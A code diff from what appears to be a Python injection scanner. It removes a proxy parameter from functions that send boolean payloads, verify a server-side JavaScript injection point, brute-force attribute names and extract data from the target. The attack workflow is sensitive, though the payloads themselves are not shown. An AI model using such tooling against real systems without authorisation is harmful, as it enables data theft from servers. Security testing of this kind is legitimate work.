@@ -19,7 +19,7 @@ def scan_array_payloads():
         #      r_data = r_data.replace(f"§{index}§", payload)
     pass
 
-def scan_bool_payloads(attack_target, baseline_response,debug=False, proxies=None): 
+def scan_bool_payloads(attack_target, baseline_response,debug=False): 
     if attack_target.request_body_type == PostRequestBodyType.JSON:
         attack_payloads = bool_json_payloads
     elif attack_target.request_body_type == PostRequestBodyType.FORM_URLENCODED:
@@ -33,7 +33,7 @@ def scan_bool_payloads(attack_target, baseline_response,debug=False, proxies=Non
 
     for payload, extraction_payload in attack_payloads:        
         #send request
-        response = send_post_request(attack_target, payload,debug=debug, proxies=proxies)
+        response = send_post_request(attack_target, payload,debug=debug)
 
         #is request error
         if response.status_code != baseline_response.status_code:
@@ -143,9 +143,9 @@ def init():
     return attack_target,verbose
 
 
-def check_SSJI(success_payloads, attack_target, proxies=None):
+def check_SSJI(success_payloads, attack_target):
     # verify extraction point    
-    extraction_point = SSJI_verify_extraction_point(success_payloads, attack_target, proxies=proxies)
+    extraction_point = SSJI_verify_extraction_point(success_payloads, attack_target)
     if not extraction_point:
         print("[-] No valid SSJI extraction point found")  
         return      
@@ -153,12 +153,12 @@ def check_SSJI(success_payloads, attack_target, proxies=None):
         print(f"[+] Valid SSJI extraction point found: {extraction_point}")        
   
     # enumerate attribute names
-    found_attributes = SSJI_brute_attribute_names(attack_target, extraction_point, proxies=proxies)
+    found_attributes = SSJI_brute_attribute_names(attack_target, extraction_point)
 
     # extract data
     results = []
     for attr, length in found_attributes:
-        res = SSJI_brute_extract_data(attack_target, extraction_point, attr, length, proxies=proxies)
+        res = SSJI_brute_extract_data(attack_target, extraction_point, attr, length)
         if res:
             print(f"[data] {attr}:{res}")   
             results.append([attr, res])
